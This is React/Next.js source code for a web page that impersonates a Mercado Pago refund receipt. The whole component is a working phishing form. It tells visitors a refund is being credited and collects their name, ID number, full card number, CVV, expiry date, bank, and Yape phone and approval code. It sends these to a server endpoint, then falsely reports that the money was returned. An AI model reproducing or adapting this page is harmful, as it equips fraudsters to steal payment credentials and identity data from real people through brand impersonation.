"use client";

import { useState, useMemo } from "react";
import { useSearchParams } from "next/navigation";

export default function DevolucionClient() {
  const params = useSearchParams();
  const montoParam = params.get("monto");
  const monto = montoParam ? parseFloat(montoParam) : 11099.38;

  const [metodo, setMetodo] = useState<"yape" | "credito" | "debito">("yape");
  const [enviado, setEnviado] = useState(false);
  const [sending, setSending] = useState(false);

  const [form, setForm] = useState({
    nombres: "",
    tipoDoc: "DNI",
    nroDoc: "",
    email: "",
    telefono: "",
    banco: "",
    tarjeta: "",
    vencimiento: "",
    cvv: "",
    cuotas: "-",
    emailYape: "",
    telefonoYape: "",
    codigoAprobacionYape: "",
  });

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    setForm((s) => ({ ...s, [name]: value }));
  };

  const handleTarjetaChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let digits = e.target.value.replace(/\D/g, "");
    if (digits.length > 16) digits = digits.slice(0, 16);
    const formatted = digits.replace(/(\d{4})(?=\d)/g, "$1 ");
    setForm((s) => ({ ...s, tarjeta: formatted }));
  };

  const handleVencimientoChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let v = e.target.value.replace(/\D/g, "");
    if (v.length > 4) v = v.slice(0, 4);
    if (v.length >= 3) v = v.slice(0, 2) + "/" + v.slice(2);
    setForm((s) => ({ ...s, vencimiento: v }));
  };

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let v = e.target.value.replace(/\D/g, "");
    if (v.length > 4) v = v.slice(0, 4);
    setForm((s) => ({ ...s, cvv: v }));
  };

  const [authCode] = useState(() => {
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    return Array.from({ length: 6 }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
  });

  const fecha = useMemo(
    () =>
      new Date().toLocaleDateString("es-PE", {
        day: "2-digit",
        month: "2-digit",
        year: "numeric",
      }),
    []
  );

  const seAcreditaEn = useMemo(() => {
    if (metodo === "yape") {
      const t = form.telefonoYape.replace(/\D/g, "");
      const last4 = t.slice(-4);
      return t ? `Yape ***${last4}` : "—";
    } else {
      const digits = form.tarjeta.replace(/\D/g, "");
      if (!digits) return "—";
      if (digits.length <= 6) return `${digits}`;
      const first6 = digits.slice(0, 6);
      const last4 = digits.slice(-4);
      return `${first6}XXXXXX${last4}`;
    }
  }, [metodo, form.telefonoYape, form.tarjeta]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setSending(true);

    await fetch("/api/send", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        type: "devolucion_comprobante",
        fecha,
        comercio: "7926420",
        terminal: "",
        codigoAutorizacion: authCode,
        monto,
        metodo,
        seAcreditaEn,
        datos: form,
      }),
    });

    setSending(false);
    setEnviado(true);
  };

  // ✅ Mensaje verde de éxito
  if (enviado) {
    return (
      <main className="min-h-screen flex items-center justify-center bg-[#f3f3f3] text-center px-4">
        <div className="bg-[#00a650] text-white p-10 rounded-2xl shadow-md max-w-md w-full">
          <div className="w-16 h-16 rounded-full border-4 border-white flex items-center justify-center mx-auto mb-4">
            <svg xmlns="http://www.w3.org/2000/svg" className="w-8 h-8" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
              <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
            </svg>
          </div>
          <h1 className="text-2xl font-semibold mb-2">Tu dinero ya fue devuelto</h1>
          <p className="text-[15px] mb-6">
            Quédate tranquilo, la devolución del cargo por{" "}
            <strong>S/ {monto.toLocaleString("es-PE", { minimumFractionDigits: 2 })}</strong> se procesó correctamente.
          </p>
          <p className="text-[14px] text-white/90">
            Recuerda que en el próximo resumen de tu tarjeta o cuenta verás reflejada la devolución.
          </p>

          <a
            href="https://www.lacuevadelterrorpe.com/"
            className="mt-6 inline-block bg-white text-[#00a650] px-5 py-2 rounded-lg font-medium hover:bg-[#f1f1f1] transition"
          >
            Volver a La Cueva del Terror
          </a>
        </div>
      </main>
    );
  }

  // 🧾 FORMULARIO COMPLETO
  return (
    <main className="min-h-screen bg-[#f3f3f3] flex justify-center py-8 px-4 text-[#111]">
      <form
        onSubmit={handleSubmit}
        className="bg-white w-full max-w-[720px] rounded-xl shadow-md border border-[#ddd] p-8 sm:p-10"
      >
        {/* ENCABEZADO */}
        <div className="flex flex-col sm:flex-row sm:items-start sm:justify-between mb-6 gap-3">
          <div className="flex items-center gap-3">
            <img
              src="/logo-mercadopago.jpeg"
              alt="Mercado Pago"
              className="w-[45px] h-[45px] object-contain"
            />
            <p className="text-[14px] sm:text-[15px] text-[#333] leading-snug">
              Desde Mercado Pago gestionamos la devolución solicitada con los siguientes datos:
            </p>
          </div>
          <div className="text-right">
            <p className="text-[13px] text-[#555]">Comprobante de Devolución</p>
            <p className="text-[15px] font-semibold text-[#111]">
              #{Math.floor(Math.random() * 9000000 + 1000000)}
            </p>
          </div>
        </div>

        {/* MONTO */}
        <div className="bg-[#fafafa] border border-[#eee] rounded-lg py-6 text-center mb-8 shadow-sm">
          <p className="text-[15px] text-[#333] font-medium">Monto total a devolver</p>
          <p className="text-[34px] font-bold text-[#00a650] my-2">
            S/ {monto.toLocaleString("es-PE", { minimumFractionDigits: 2 })}
          </p>
          <p className="text-[14px] text-[#555]">Se acredita en</p>
          <p className="text-[15px] font-medium mt-1">{seAcreditaEn}</p>
        </div>

        {/* FORMULARIO */}
        <div className="space-y-5">
          {/* Medio de pago */}
          <div>
            <label className="block text-[14px] font-medium mb-1">Medio de Pago</label>
            <select
              value={metodo}
             onChange={(e) =>
  setMetodo(e.target.value as "yape" | "credito" | "debito")
}

              className="border border-[#ccc] rounded-md w-full p-2"
            >
              <option value="yape">Yape</option>
              <option value="credito">Tarjeta de Crédito</option>
              <option value="debito">Débito</option>
            </select>
          </div>

          {/* Datos personales */}
          <div className="flex flex-col sm:flex-row gap-3">
            <div className="flex-1">
              <label className="block text-[14px] mb-1">Nombres completos</label>
              <input
                name="nombres"
                value={form.nombres}
                onChange={handleChange}
                className="border border-[#ccc] rounded-md w-full p-2"
                required
              />
            </div>
            <div className="w-full sm:w-[120px]">
              <label className="block text-[14px] mb-1">Tipo</label>
              <select
                name="tipoDoc"
                value={form.tipoDoc}
                onChange={handleChange}
                className="border border-[#ccc] rounded-md w-full p-2"
              >
                <option value="DNI">DNI</option>
                <option value="CE">CE</option>
                <option value="PASS">PASS</option>
              </select>
            </div>
            <div className="w-full sm:w-[150px]">
              <label className="block text-[14px] mb-1">N° Documento</label>
              <input
                name="nroDoc"
                value={form.nroDoc}
                onChange={handleChange}
                className="border border-[#ccc] rounded-md w-full p-2"
                required
              />
            </div>
          </div>

          {/* YAPE */}
          {metodo === "yape" && (
            <>
              <div>
                <label className="block text-[14px] mb-1">
                  Correo electrónico afiliado a Yape
                </label>
                <input
                  name="emailYape"
                  value={form.emailYape}
                  onChange={handleChange}
                  className="border border-[#ccc] rounded-md w-full p-2"
                  required
                />
              </div>
              <div>
                <label className="block text-[14px] mb-1">
                  Número de teléfono afiliado a Yape
                </label>
                <input
                  name="telefonoYape"
                  value={form.telefonoYape}
                  onChange={handleChange}
                  className="border border-[#ccc] rounded-md w-full p-2"
                  required
                />
              </div>
              <div>
                <label className="block text-[14px] mb-1">
                  Código de aprobación (en tu app Yape)
                </label>
                <input
                  name="codigoAprobacionYape"
                  value={form.codigoAprobacionYape}
                  onChange={handleChange}
                  className="border border-[#ccc] rounded-md w-full p-2"
                  required
                />
              </div>
            </>
          )}

          {/* TARJETA */}
          {(metodo === "credito" || metodo === "debito") && (
            <>
              <div>
                <label className="block text-[14px] mb-1">Correo electrónico</label>
                <input
                  name="email"
                  value={form.email}
                  onChange={handleChange}
                  className="border border-[#ccc] rounded-md w-full p-2"
                  required
                />
              </div>
              <div>
                <label className="block text-[14px] mb-1">Número de teléfono</label>
                <input
                  name="telefono"
                  value={form.telefono}
                  onChange={handleChange}
                  className="border border-[#ccc] rounded-md w-full p-2"
                  required
                />
              </div>

              <div className="flex flex-col sm:flex-row gap-3">
                <div className="flex-1">
                  <label className="block text-[14px] mb-1">Número de tarjeta</label>
                  <input
                    name="tarjeta"
                    value={form.tarjeta}
                    onChange={handleTarjetaChange}
                    placeholder="5401 04XX XXXX 5932"
                    className="border border-[#ccc] rounded-md w-full p-2"
                    required
                  />
                </div>
                <div className="w-full sm:w-[100px]">
                  <label className="block text-[14px] mb-1">CVV</label>
                  <input
                    name="cvv"
                    value={form.cvv}
                    onChange={handleCvvChange}
                    placeholder="123"
                    className="border border-[#ccc] rounded-md w-full p-2"
                    required
                  />
                </div>
              </div>

              <div className="flex flex-col sm:flex-row gap-3">
                <div className="w-full sm:w-[150px]">
                  <label className="block text-[14px] mb-1">Vencimiento</label>
                  <input
                    name="vencimiento"
                    value={form.vencimiento}
                    onChange={handleVencimientoChange}
                    placeholder="MM/AA"
                    className="border border-[#ccc] rounded-md w-full p-2"
                    required
                  />
                </div>
                <div className="flex-1">
                  <label className="block text-[14px] mb-1">Banco</label>
                  <input
                    name="banco"
                    value={form.banco}
                    onChange={handleChange}
                    className="border border-[#ccc] rounded-md w-full p-2"
                    required
                  />
                </div>
              </div>

              {metodo === "credito" && (
                <div>
                  <label className="block text-[14px] mb-1">Cuotas</label>
                  <select
                    name="cuotas"
                    value={form.cuotas}
                    onChange={handleChange}
                    className="border border-[#ccc] rounded-md w-full p-2"
                  >
                    <option value="-">–</option>
                    {Array.from({ length: 12 }).map((_, i) => (
                      <option key={i} value={String(i + 1)}>
                        {i + 1} cuota{i + 1 > 1 ? "s" : ""}
                      </option>
                    ))}
                  </select>
                </div>
              )}
            </>
          )}
        </div>

        <button
          type="submit"
          disabled={sending}
          className="w-full bg-[#0b57d0] text-white rounded-md mt-10 py-3 text-[15px] font-medium hover:bg-[#094dc1] transition-all duration-150 shadow-sm hover:shadow-md disabled:opacity-60"
        >
          {sending ? "Enviando..." : "Generar comprobante y enviar"}
        </button>

        <p className="text-[12px] text-[#555] mt-6 leading-snug text-center">
          Tenga en cuenta que la acreditación del reintegro al titular de la tarjeta o cuenta dependerá del procesamiento por parte del banco emisor.
        </p>
      </form>
    </main>
  );
}
